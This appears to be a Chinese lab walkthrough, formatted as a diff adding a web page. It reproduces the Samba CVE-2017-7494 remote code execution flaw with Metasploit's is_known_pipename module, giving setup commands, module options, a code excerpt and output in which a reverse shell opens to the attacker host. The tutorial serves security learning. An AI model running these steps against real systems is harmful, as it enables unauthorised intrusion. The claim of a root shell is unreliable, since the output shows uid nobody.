@@ -1,0 +1,132 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h4 data-content="1" id="100740d6adda42fe2906dc1f7002fc49">概述</h4>
+<p>linux或unix下所使用Samba服务允许恶意的用户上传类库到可读可写的共享目录进而导致服务器远程代码执行。</p>
+<p>漏洞编号: CVE-2017-7494</p>
+<p>漏洞等级: 严重</p>
+<p>漏洞影响: Samba 3.5.0 和包括4.6.4/4.5.10/4.4.14中间版本</p>
+<p>默认端口: 445</p>
+<h4 data-content="1" id="eebe097efdc7372d924c19bed8a7ea7f">漏洞复现</h4>
+<p>1.靶机环境搭建：</p>
+<p>靶机环境系统使用kali:</p>
+<pre><code>IP地址：192.168.10.62
+
+root@yunxu:/# uname -a
+Linux yunxu 4.9.0-kali3-amd64 #1 SMP Debian 4.9.18-1kali1 (2017-04-04) x86_64 GNU/Linux</code></pre>
+<p>安装samba：</p>
+<p><code>apt-get install samba</code></p>
+<p>配置samba的共享目录:</p>
+<pre><code>root@yunxu:/# mkdir /home/share   #创建一个共享目录
+root@yunxu:/# chmod 777 /home/share  #设置权限</code></pre>
+<p>修改samba配置文件：</p>
+<pre><code>root@yunxu:/# gedit /etc/samba/smb.conf  #编辑下配置文件</code></pre>
+<p>    在配置文件末尾添加一个新的配置</p>
+<pre><code>  [myshare]
+ comment=test
+ browseable=yes #可读
+ writeable=yes #可写
+ path=/home/share  #设置目录，这里设置刚刚创建的
+ guest ok=yes #允许匿名访问，暂时先这样设置</code></pre>
+<p>启动服务：</p>
+<p><code>root@yunxu:/# service smbd start</code></p>
+<p>2.metasploit 利用</p>
+<p>攻击环境系统使用kali:</p>
+<p><code>IP：192.168.10.124</code></p>
+<p>更新msf利用模块：</p>
+<p>该漏洞的利用poc已经在metasploit的github上更新，下载地址：</p>
+<p><a href="https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb" target="_blank">https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb</a></p>
+<p>将模块更新到kali下metasploit的目录中：</p>
+<pre><code>/usr/share/metasploit-framework/modules/exploits/linux/samba/is_known_pipename.rb</code></pre>
+<p>设置模块:</p>
+<pre><code>msf &gt; use exploit/linux/samba/is_known_pipename 
+msf exploit(is_known_pipename) &gt; show options</code></pre>
+<p><img src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1705/4_1735961641329452_71cd6188055076a.jpg"/></p>
+<p>这里需要设置几个参数</p>
+<p>rhost 设置目标IP地址</p>
+<p>rport 设置目标端口，默认是445</p>
+<p>smb_share_base 设置smb目录，这里靶机是/home/share</p>
+<p>target 设置系统版本</p>
+<p>通过查看该利用模块的代码发现，该利用模块默认可以不设置smb_share_base目录，他会通过一些预定义的目录搜索可读可写的目录，如果文件共享目录不在这些预定义目录中需要我们手动设置smb_share_base功能，模块部分代码如下：</p>
+<pre><code>def generate_common_locations
+candidates = []
+if datastore['SMB_SHARE_BASE'].to_s.length &gt; 0
+    candidates &lt;&lt; datastore['SMB_SHARE_BASE']
+end
+
+%W{/volume1 /volume2 /volume3 /shared /mnt /mnt/usb /media /mnt/media /var/samba /tmp /home /home/shared}.each do |base_name|
+    candidates &lt;&lt; base_name
+    candidates &lt;&lt; [base_name, @share]
+    candidates &lt;&lt; [base_name, @share.downcase]
+    candidates &lt;&lt; [base_name, @share.upcase]
+    candidates &lt;&lt; [base_name, @share.capitalize]
+    candidates &lt;&lt; [base_name, @share.gsub(" ", "_")]
+end
+
+candidates.uniq
+end</code></pre>
+<p>预定义的目录：</p>
+<pre><code>/volume1 
+/volume2 
+/volume3 
+/shared 
+/mnt 
+/mnt/usb 
+/media 
+/mnt/media 
+/var/samba 
+/tmp 
+/home 
+/home/shared</code></pre>
+<p>因为靶机的目录是/home/share，所以需要手动设置下smb_share_base，设置步骤如下：</p>
+<pre><code>msf exploit(is_known_pipename) &gt; set rhost 192.168.10.62
+rhost =&gt; 192.168.10.62 
+msf exploit(is_known_pipename) &gt; set smb_share_base /home/share
+smb_share_base =&gt; /home/share
+msf exploit(is_known_pipename) &gt; set target 0
+target =&gt; 0</code></pre>
+<p><img src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1705/4_1735961641329452_02bb2caa9cbb7a8.jpg"/></p>
+<p>可以选择一个自己喜欢用的payload,这里我使用默认的。</p>
+<p>msf exploit(is_known_pipename) &gt; exploit</p>
+<pre><code>[*] Started reverse TCP handler on 192.168.10.124:4444 
+[*] 192.168.10.62:445 - Using location \\192.168.10.62\myshare\ for the path
+[*] 192.168.10.62:445 - Payload is stored in //192.168.10.62/myshare/ as LLaLrtwG.so
+[*] 192.168.10.62:445 - Trying location /home/share/LLaLrtwG.so...
+[*] Command shell session 1 opened (192.168.10.124:4444 -&gt; 192.168.10.62:33614) at 2017-05-25 17:43:11 +0800
+
+id
+uid=65534(nobody) gid=0(root) egid=65534(nogroup) groups=65534(nogroup)</code></pre>
+<p><img src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1705/4_1735961641329452_bb0c4f8fdd03fd3.jpg"/><br/>
+这样攻击就可以完成了，我们直接拿到了root权限的shell,但是smb服务通常管理员为了安全会设置账号密码，如果在有账号密码的环境下怎么办呢？这里靶机重新修改下配置如下：</p>
+<pre><code>root@yunxu:/# gedit /etc/samba/smb.conf</code></pre>
+<p>设置共享目录不允许guest访问：</p>
+<pre><code>[myshare]
+comment=test
+browseable=yes #可读
+writeable=yes #可写
+path=/home/share  #设置目录，这里设置刚刚的
+#删除guest ok=yes，不允许guest用户访问</code></pre>
+<p>在 <code>[global]</code> 设置选项中添加配置：</p>
+<pre><code>security = user</code></pre>
+<p>设置smb用户：</p>
+<pre><code>    root@yunxu:/# useradd smbuser     #添加用户
+    root@yunxu:/# smbpasswd -a smbuser #设置密码
+    New SMB password:
+    Retype new SMB password:
+
+    root@yunxu:/# service smbd restart #重启服务</code></pre>
+<p>接下来smb账户就需要提供用户名和密码才能访问了，为了测试可以直接在msf中<code>exploit</code>看看能否像刚刚那样成功反弹一个shell。</p>
+<p><img src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1705/4_1735961641329452_9219290cc2b9281.jpg"/></p>
+<p>这里攻击靶机的时候可以看到失败了，说明添加用户密码后无法正常连接，那么可以通过设置用户名和密码的参数来试试，模块默认不显示这两个参数，可以手动设置下</p>
+<pre><code>msf exploit(is_known_pipename) &gt; set SMBUSER smbuser
+SMBUser =&gt; smbuser
+msf exploit(is_known_pipename) &gt; set SMBPASS 123123
+SMBPass =&gt; 123123</code></pre>
+<p><img src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1705/4_1735961641329452_c52d2eac1e159db.jpg"/></p>
+<p>尝试执行exploit：</p>
+<p><img src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1705/4_1735961641329452_43ff90650472597.jpg"/></p>
+<p>参考：<br/>
+    <a href="http://bobao.360.cn/learning/detail/3900.html" target="_blank">http://bobao.360.cn/learning/detail/3900.html</a><br/>
+    <a href="https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/" target="_blank">https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/</a><br/>
+    <a href="https://github.com/rapid7/metasploit-framework/pull/8450" target="_blank">https://github.com/rapid7/metasploit-framework/pull/8450</a></p>
+</div>
+</div>
